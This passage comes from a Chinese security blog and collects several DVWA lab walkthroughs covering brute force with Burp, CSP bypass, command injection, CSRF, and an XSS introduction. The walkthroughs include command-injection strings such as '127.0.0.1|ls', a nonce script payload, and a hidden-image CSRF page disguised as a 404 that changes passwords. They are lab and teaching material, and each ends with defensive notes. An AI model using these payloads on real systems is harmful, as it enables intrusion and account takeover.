<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>源码如下，Medium 级别的代码主要增加了 mysql_real_escape_string 函数，该函数会对字符串中的特殊符号进行转义，从而对用户输入的参数进行了简单的过滤。相比 low 级别的代码，当登录验证失败时界面将冻结 2 秒，从而影响了爆破操作的效率，不过如果是一个闲来无事并且很有耐心的白帽黑客，爆破出密码仍然是时间问题。</p>
<p><img src="/aposts/b7636e10/image-20220127170706740.png" alt="image-20220127170706740"></p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>和 low 级别一样，还是用 Brup 抓包后爆破即可，只是因为每次测试都要等上 2 秒，需要等稍长的时间而已。</p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><p>开发者使用了 “CSRF” 的反伪造请求，有一个旧的说法表示这种保护可以阻止暴力攻击，但事实并非如此。这个级别也扩展了中等级别，在登录失败时等待，但这次是 2 到 4 秒之间的随机时间，这样做的目的是试图混淆任何时间预测。使用验证码表单可能会产生与 CSRF 令牌类似的效果。</p>
<h3 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3><p>High 级别的代码使用了stripslashes 函数，进一步过滤输入的内容。同时使用了 Token 抵御 CSRF 攻击，在每次登录时网页会随机生成一个 user_token 参数，在用户提交用户名和密码时要对 token 进行检查再进行 sql 查询</p>
<p><img src="/aposts/b7636e10/image-20220127171703241.png" alt="image-20220127171703241"></p>
<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在Brute Force中，用户名输入admin，密码输入1123（错误的密码），正确的密码是password，点击登录被Burp 拦截</p>
<p><img src="/aposts/b7636e10/image-20220127152224491.png" alt="image-20220127152224491"></p>
<p>被拦截的请求多个token</p>
<p><img src="/aposts/b7636e10/image-20220128114155998.png" alt="image-20220128114155998"></p>
<p>把拦截的请求发送到测试器</p>
<p><img src="/aposts/b7636e10/image-20220127152650009.png" alt="image-20220127152650009"></p>
<p>在测试器中，我把密码和token作为被攻击的参数，攻击类型需要改为<strong>Pitchfork</strong></p>
<p><img src="/aposts/b7636e10/image-20220128160535877.png" alt="image-20220128160535877"></p>
<h4 id="设置密码的规则"><a href="#设置密码的规则" class="headerlink" title="设置密码的规则"></a>设置密码的规则</h4><h5 id="Playloads设置"><a href="#Playloads设置" class="headerlink" title="Playloads设置"></a>Playloads设置</h5><p>和之前一样，载入密码字典</p>
<p><img src="/aposts/b7636e10/image-20220128115211854.png" alt="image-20220128115211854"></p>
<h4 id="token的设置"><a href="#token的设置" class="headerlink" title="token的设置"></a>token的设置</h4><h5 id="Playloads设置-1"><a href="#Playloads设置-1" class="headerlink" title="Playloads设置"></a>Playloads设置</h5><p>有效载荷类型为递归搜索</p>
<p><img src="/aposts/b7636e10/image-20220128115300062.png" alt="image-20220128115300062"></p>
<h5 id="Options的设置"><a href="#Options的设置" class="headerlink" title="Options的设置"></a>Options的设置</h5><p>线程数设置为1，这样就能每次只取一个token值</p>
<p><img src="/aposts/b7636e10/image-20220128115449383.png" alt="image-20220128115449383"></p>
<p>重定向设置为总是</p>
<p><img src="/aposts/b7636e10/image-20220128115631963.png" alt="image-20220128115631963"></p>
<p>Grep-Extract设置，在响应结果中提前token的值，如果响应是302就要重新获取请求或者拦截，点击token的值，分隔符自带填入进去</p>
<p><img src="/aposts/b7636e10/image-20220128154844054.png" alt="image-20220128154844054"></p>
<ul>
<li>点击ok后，发现递归搜索文本框中自带填入了规则值</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220128155009012.png" alt="image-20220128155009012"></p>
<p>并在playloads初始化有效负载中填入token的值</p>
<p><img src="/aposts/b7636e10/image-20220128155121049.png" alt="image-20220128155121049"></p>
<p>完成这些，我们就可以开始攻击了，按start attack</p>
<p><img src="/aposts/b7636e10/image-20220128160644340.png" alt="image-20220128160644340"></p>
<p>测试完成后，查看结果</p>
<p><img src="/aposts/b7636e10/image-20220128160432361.png" alt="image-20220128160432361"></p>
<h2 id="安全等级为Impossible"><a href="#安全等级为Impossible" class="headerlink" title="安全等级为Impossible"></a>安全等级为Impossible</h2><p><img src="/aposts/b7636e10/image-20220128161118392.png" alt="image-20220128161118392"></p>
<p>暴力（和用户枚举）不应该在该级别的代码上实现，开发人员增加了一个“锁定”功能，如果在过去 15 分钟内有5次错误登录，被锁定的用户将无法登录。</p>
<h3 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h3><p><img src="/aposts/b7636e10/image-20220128161334594.png" alt="image-20220128161334594"></p>
<h2 id="总结与防御"><a href="#总结与防御" class="headerlink" title="总结与防御"></a>总结与防御</h2><ul>
<li>由于服务器没有对用户的输入次数进行限制，导致攻击者可以利用爆破的手段来进行攻击，通过穷举法将用户名、密码等信息爆出来。当攻击者结合社会工程学生成了庞大的字典时，爆破攻击的可能性将会被增大。对于爆破漏洞，开发者可以对用户的登陆次数设置阈值，当某用户名表示的用户的登录次数在一定时间内超过阈值时，就暂时锁定用户。也可以进行 IP 检测，如果某个 IP 的登录次数超过阈值也可以锁定 IP。当然还有一种我们熟悉的方式，就是设置只有人可以通过验证的验证码或者是其他的验证手法，来保证进行登录操作的是人而不是机器。</li>
<li>Burp的字典爆破可以一站式爆出结果，很方便，但是字典攻击一般很耗时，穷举的爆破一般渗透中不是上选，而且这种爆破手段对字典有要求，理论上时间充足的话足够优秀的字典无敌。但是可惜实战中不会用那么多时间，<strong>如果登录次数错误有限制以及验证码等一些列措施，并不适合此方式</strong></li>
<li>本文主要来自<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">DVWA通关详解</a>和<a href="https://www.cnblogs.com/linfangnan/p/13652761.html">DVWA 通关指南：Brute Force (爆破)</a></li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-CSP Bypass(内容安全策略)</title>
    <url>/aposts/62baea94/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>CPS即内容安全策略，实质就是<strong>白名单制度</strong>，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
<h3 id="开启方法"><a href="#开启方法" class="headerlink" title="开启方法"></a>开启方法</h3><ul>
<li><p>抄录于<a href="https://www.zhihu.com/question/21979782">这里</a></p>
</li>
<li><p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的Content-Security-Policy的字段。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; </span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/62baea94/image-20220215092004385.png" alt="image-20220215092004385"></p>
</li>
<li><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，CSP 做了如下配置。</p>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>http://cdn.example.org</code>和<code>http://third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><strong>结论：攻击失败，原因分析在下面有说明</strong></p>
<p><img src="/aposts/62baea94/image-20220215092558062.png" alt="image-20220215092558062"></p>
<h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>从源码查看设置了headerCSP，可以知道以下语句可以被执行：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://pastebin.com</span><br><span class="line">hastebin.com</span><br><span class="line">example.com</span><br><span class="line">code.jquery.com</span><br><span class="line">https://ssl.google-analytics.com</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/62baea94/image-20220215092503894.png" alt="image-20220215092503894"></p>
<p>f12查看当前页面请求，也能发现CSP的设置</p>
<p><img src="/aposts/62baea94/image-20220215092925167.png" alt="image-20220215092925167"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>首先在<code>https://pastebin.com/</code>里边创建一个JavaScript代码<code>alert(&quot;hahaha&quot;)</code>保存记住链接</p>
<p><img src="/aposts/62baea94/image-20220215093103371.png" alt="image-20220215093103371"></p>
<p>点击右上角的raw</p>
<p><img src="/aposts/62baea94/image-20220215093156720.png" alt="image-20220215093156720"></p>
<p>得到了分享链接：<a href="https://pastebin.com/raw/PgTLeSd2">https://pastebin.com/raw/PgTLeSd2</a></p>
<p><img src="/aposts/62baea94/image-20220215093230759.png" alt="image-20220215093230759"></p>
<p>把得到的链接输入输入框中</p>
<p><img src="/aposts/62baea94/image-20220215093353837.png" alt="image-20220215093353837"></p>
<ul>
<li><p><strong>发现无论是否挂梯子，都不会弹出提示框</strong>，经过抓包分析，单独在浏览器中请求:<a href="https://pastebin.com/raw/PgTLeSd2%E6%88%90%E5%8A%9F%EF%BC%8C%E8%BE%93%E5%85%A5%E5%88%B0%E6%96%87%E6%9C%AC%E6%A1%86%E4%B8%AD%E5%90%8E**%E5%8F%91%E7%8E%B0%E6%9C%89%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%EF%BC%8C%E6%9A%82%E6%97%B6%E4%B8%8D%E7%9F%A5%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3">https://pastebin.com/raw/PgTLeSd2成功，输入到文本框中后**发现有跨域问题，暂时不知如何解决</a>**</p>
</li>
<li><p>下图就是执行pastebin的请求，虽然请求响应为200，但是无任何响应数据</p>
</li>
</ul>
<p><img src="/aposts/62baea94/image-20220215103943833.png" alt="image-20220215103943833"></p>
<p>打开Console发现出现类似于跨域报错问题</p>
<p><img src="/aposts/62baea94/image-20220215104125884.png" alt="image-20220215104125884"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>unsafe-inline：当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 不过当frame-src<br>为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。</li>
<li>nonce-source，仅允许特定的内联脚本块。如源码中：<code>nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;</code></li>
</ul>
<p><img src="/aposts/62baea94/image-20220215104504770.png" alt="image-20220215104504770"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>直接输入：<code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="/aposts/62baea94/image-20220215104701452.png" alt="image-20220215104701452"></p>
<p><img src="/aposts/62baea94/image-20220215104717799.png" alt="image-20220215104717799"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><p><img src="/aposts/62baea94/image-20220215105533492.png" alt="image-20220215105533492"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="后台代码"><a href="#后台代码" class="headerlink" title="后台代码"></a>后台代码</h4><p>这里可以看到除了自身，其余的外部资源全部过滤了</p>
<p><img src="/aposts/62baea94/image-20220215105448255.png" alt="image-20220215105448255"></p>
<h4 id="前端js"><a href="#前端js" class="headerlink" title="前端js"></a>前端js</h4><p>前端直接调用了一个回调函数solveSum，没有对此传参进行任何处理</p>
<p><img src="/aposts/62baea94/image-20220215105654909.png" alt="image-20220215105654909"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>谷歌浏览器按f12，打开source页签，找到high.js文件，加个断点，修改callback参数为<code>alert(document.cookie)</code>,记得按<code>ctrl+s</code>保存修改</p>
<p><img src="/aposts/62baea94/image-20220215110402569.png" alt="image-20220215110402569"></p>
<p>点击页面上的按钮</p>
<p><img src="/aposts/62baea94/image-20220215110854695.png" alt="image-20220215110854695"></p>
<p>点击继续运行按钮</p>
<p><img src="/aposts/62baea94/image-20220215111146007.png" alt="image-20220215111146007"></p>
<p>出现弹框</p>
<p><img src="/aposts/62baea94/image-20220215111208307.png" alt="image-20220215111208307"></p>
<h2 id="安全等级为"><a href="#安全等级为" class="headerlink" title="安全等级为"></a>安全等级为</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>前端没有回调函数了</p>
<p><img src="/aposts/62baea94/image-20220215111736306.png" alt="image-20220215111736306"></p>
<p>本文主要操作步骤来源<a href="https://blog.csdn.net/weixin_42075643/article/details/113928878?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5.pc_relevant_default&utm_relevant_index=8">这里</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-Command Injection（命令注入）</title>
    <url>/aposts/162a21c6/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>承接上文<a href="https://moon-full.gitee.io/2022/01/27/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-Brute%20Force(%E7%88%86%E7%A0%B4)/">DVWA通关指南-Brute Force(爆破)</a>，本文对Command Injection（命令注入）进行实践</li>
<li>命令注入攻击的目的是，在易受攻击的应用程序中注入和执行攻击者指定的命令。在这种情况下，执行不需要的系统命令的应用程序就像一个伪系统外壳，攻击者可以将其作为任何授权的系统用户使用。但是，执行命令的权限和环境与 web 服务相同。</li>
<li>在大多数情况下，由于缺少正确的输入数据验证，攻击者对例如表单、cookies、HTTP标头等进行操控，使得命令注入攻击成为可能。此攻击也称为“远程命令执行 (RCE)”。</li>
<li>通过 RCE 远程查找操作系统上 web 服务的用户以及机器主机名。</li>
</ul>
<h2 id="安全等级为LOW"><a href="#安全等级为LOW" class="headerlink" title="安全等级为LOW"></a>安全等级为LOW</h2><ul>
<li><p>在该等级下允许直接输入指令给一些 PHP 函数，从而使这些指令将在操作系统上执行。在输入其他的一些的指令时，有可能发生不符合设计意图的命令被执行。</p>
</li>
<li><p>这可以通过在请求中添加“一旦命令成功执行，运行此命令”的其他指令来完成。</p>
</li>
</ul>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>传入的 ping 命令的参数 target，并没有进行任何过滤。</p>
<p><img src="/aposts/162a21c6/image-20220129092654893.png" alt="image-20220129092654893"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
<li>由于在操作系统中，“&amp;”、“&amp;&amp;”、“|”、“||”都可以作为命令连接符使用，由于网页没有对参数进行任何过滤，因此可以用连接符后面接上其他指令来执行</li>
<li>输入: <code>127.0.0.1 &amp;&amp; ls</code></li>
</ul>
<p><img src="/aposts/162a21c6/image-20220129092930315.png" alt="image-20220129092930315"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><p>开发人员已经知晓有关命令注入的一些问题，并使用了各种方式来过滤输入。然而这还不够，攻击者仍然可以使用各种其他系统语法来执行所需的命令。</p>
<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>源码如下，medium 级别的代码加入了对“&amp;&amp;”和“;”的过滤，替换成空格</p>
<p><img src="/aposts/162a21c6/image-20220129095247031.png" alt="image-20220129095247031"></p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
<li><p>输入<code>127.0.0.1&amp;ls /usr/</code></p>
</li>
<li><p>“&amp;&amp;” 连接符不能用了，那我们就用 “&amp;” 连接符来替代就行了。这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
</li>
<li><p><strong>Command 1&amp;&amp;Command 2</strong></p>
<ul>
<li>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</li>
</ul>
</li>
<li><p><strong>Command 1&amp;Command 2</strong></p>
<ul>
<li>先执行Command 1，不管是否成功，都会执行Command 2</li>
</ul>
</li>
</ul>
<p><img src="/aposts/162a21c6/image-20220129095529294.png" alt="image-20220129095529294"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3><p>相比 Medium 级别的代码，High 级别的代码进一步完善了过滤的黑名单。</p>
<p><img src="/aposts/162a21c6/image-20220129104751233.png" alt="image-20220129104751233"></p>
<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>输入：<code>127.0.0.1|ls /usr/</code></p>
<p><img src="/aposts/162a21c6/image-20220129104936769.png" alt="image-20220129104936769"></p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>mpossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。 </p>
<ul>
<li>代码中使用<code>stripslashes() </code>函数 删除反斜杠，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</li>
<li><code>explode()</code> 函数 使用一个字符串分割另一个字符串，并返回由字符串组成的数组</li>
<li><code>is_numeric(string)</code>: 该检测string是否为数字或数字字符串</li>
</ul>
<p><img src="/aposts/162a21c6/image-20220129105616718.png" alt="image-20220129105616718"></p>
<h2 id="总结与防御"><a href="#总结与防御" class="headerlink" title="总结与防御"></a>总结与防御</h2><p>在一些 Web 程序中需要调用一些执行系统命令的函数，例如 PHP 的 system、exec、shell_exec 函数等。当攻击者能够直接操作命令执行的参数，并且没有代码对传入的参数进行过滤时，攻击者就能将用于搞破坏的系统命令夹带进来让系统执行。<br>在 Windows 系统和 Linux 系统中都有一些管道符，这些管道符可以被用来拼接攻击指令：</p>
<ul>
<li>“&amp;&amp;”：前面的语句正确执行时，才执行后面的语句；</li>
<li>“&amp;”：前面的语句执行出错时，执行后面的语句；</li>
<li>“|”：将前面的语句运行的结果，当做后面语句的输入，显示后面语句的执行结果；</li>
<li>“||”：前面的语句出错时，执行后面的语句。</li>
</ul>
<p>对于指令注入漏洞，比较好的防御方式是尽可能别用命令执行函数，对于输入的参数要做好黑名单过滤或者白名单验证</p>
<ul>
<li>本文主要来自<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">DVWA通关详解</a></li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-CSRF(跨站请求伪造)</title>
    <url>/aposts/824ce28e/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>承接上文<a href="https://moon-full.gitee.io/2022/01/29/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-Command-Injection%EF%BC%88%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%89/">DVWA通关指南-Command-Injection（命令注入）</a>，本文对Cross Site Request Forgery (CSRF)（跨站请求伪造）进行实践</li>
<li>一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令</li>
<li>本次功能是对登录密码进行修改，修改后请用新密码登录DVWA</li>
</ul>
<h2 id="安全等级为LOW"><a href="#安全等级为LOW" class="headerlink" title="安全等级为LOW"></a>安全等级为LOW</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><img src="/aposts/824ce28e/image-20220207151219460.png" alt="image-20220207151219460"></p>
<p>抓包查看，直接就是get请求，没有任何防护，如token验证</p>
<p><img src="/aposts/824ce28e/image-20220207154001441.png" alt="image-20220207154001441"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><p>抓包发现，修改密码的url其实就是一个get请求，链接如下：<a href="http://ip/DVWA-2.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change">http://ip/DVWA-2.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</a></p>
</li>
<li><p>只要诱骗用户点击这个恶意链接，就会将在不知情的情况下将密码改为123456</p>
</li>
</ul>
<p><strong>我们使用Burpsuite中的PoC检测CSRF</strong></p>
<ul>
<li>拦截到请求后，点击行动-相关工具-CSRF PoC生成</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207153930211.png" alt="image-20220207153930211"></p>
<ul>
<li>点击 在浏览器中测试</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207154417669.png" alt="image-20220207154417669"></p>
<ul>
<li>Burpsuite会自动创建一个站点,复制 URL</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207154442878.png" alt="image-20220207154442878"></p>
<ul>
<li>用复制的链接无法访问，改为如此就可以了<ul>
<li><a href="http://127.0.0.1:8080/show/9/4w8z4wwlz1uk23ho7hliosh2gaxw584b">http://127.0.0.1:8080/show/9/4w8z4wwlz1uk23ho7hliosh2gaxw584b</a></li>
</ul>
</li>
<li>点击提交按钮</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207160513370.png" alt="image-20220207160513370"></p>
<ul>
<li>提交后，自动跳转url其实是修改密码的url，查看到提示密码修改成功，用新密码123456登录成功</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207160636051.png"></p>
<p><img src="/aposts/824ce28e/image-20220207160801912.png" alt="image-20220207160801912"></p>
<p><strong>我们可以伪装恶意代码</strong></p>
<ul>
<li>我们将构造的恶意链接伪装，放入index.html中</li>
<li>打开我的服务器中的httpd中的dvwa目录下，新建index.html</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# vi index.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;http://xxx.xxx.xxx.xx/DVWA-2.0.1/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt; </span><br><span class="line">&lt;h2&gt;resource not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>重启服务器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# service httpd restart</span><br><span class="line">Redirecting to /bin/systemctl restart httpd.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问刚刚编辑的index.html，查看请求发现发起 了修改密码</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207170837412.png" alt="image-20220207170837412"></p>
<h2 id="安全等级为：medium"><a href="#安全等级为：medium" class="headerlink" title="安全等级为：medium"></a>安全等级为：medium</h2><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名），希望通过这种机制抵御CSRF攻击。</p>
<p><img src="/aposts/824ce28e/image-20220207171945510.png" alt="image-20220207171945510"></p>
<p>使用安全等级为Low访问index.html的方式时，发送修改密码的请求，一直加载中最后响应302后，自动发送登录请求</p>
<p><img src="/aposts/824ce28e/image-20220207172258697.png" alt="image-20220207172258697"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>漏洞利用过滤规则是http包头的Referer参数的值中必须包含主机名（这里是我服务器的ip）我们可以将攻击页面命名为XX.XX.XX.XX.php（XX是服务器的host，页面被放置在攻击者的服务器里）就可以绕过了</li>
<li>准备php文件，把密码修改成12345678</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# vi XX.XX.XX.XX.php</span><br><span class="line"> </span><br><span class="line">&lt;img src=&quot;http://XX.XX.XX.XX/DVWA-2.0.1/vulnerabilities/csrf/?password_new=12345678&amp;password_conf=12345678&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt; </span><br><span class="line">&lt;h2&gt;resource not found.&lt;h2&gt;</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问刚刚新增的host.php文件，发现修改密码修改成功了(用12345678登录成功)，请求头部加入了Referer</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207174637976.png" alt="image-20220207174637976"></p>
<h2 id="安全等级为Hight"><a href="#安全等级为Hight" class="headerlink" title="安全等级为Hight"></a>安全等级为Hight</h2><p>修改密码查看请求看下区别</p>
<p><img src="/aposts/824ce28e/image-20220208090610360.png" alt="image-20220208090610360"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p><img src="/aposts/824ce28e/image-20220208090125335.png" alt="image-20220208090125335"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>客户端访问攻击页面-&gt;攻击页面获取修改密码页面的token-&gt;将token和密码作为参数一起提交，攻击页面获取修改密码页面的token这一步属于跨域请求，浏览器已经禁止这么做了，所以想要完整这个操作，有两个思路：</p>
<ul>
<li>第一， 将该js上传到服务器的目录下，这样就是同一个域了，不过如果可以这样，为啥不放木马呢？</li>
<li>第二， 利用xss，xss可以执行代码，获取token，xss更现实一点，但是也得需要该网站存在xss，所以单纯从这个修改密码页面，无法突破High漏洞，本此不坐实际，等到时候学到xss时，反过来再做实际</li>
</ul>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><p>这里让输入原密码，不清楚原密码的情况下，就无法进行CSRF攻击。</p>
<p>结合业务设计，修改密码必须提供原密码，保障安全。</p>
<p><img src="/aposts/824ce28e/image-20220208091727056.png" alt="image-20220208091727056"></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-DOM-XSS-DOM型跨站脚本攻击</title>
    <url>/aposts/27850020/</url>
    <content><![CDATA[<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
<li>XSS(跨站脚本攻击)，是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</li>
<li>XSS存在的根本原因是,对URL中的参数和对用户输入提交给web server的内容,没有进行充分的过滤</li>
</ul>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul>
<li><strong>持久化 XSS</strong>：恶意代码通常来自网站数据库。</li>
<li><strong>反射式 XSS</strong>：恶意代码通常来自用户请求。</li>
<li><strong>基于 DOM 的XSS</strong>：漏洞通常在客户端而非服务端，DOM XSS 是由于浏览器解析机制导致的漏洞，服务器不参与，而存储型与反射型都需要服务器响应参与</li>
</ul>
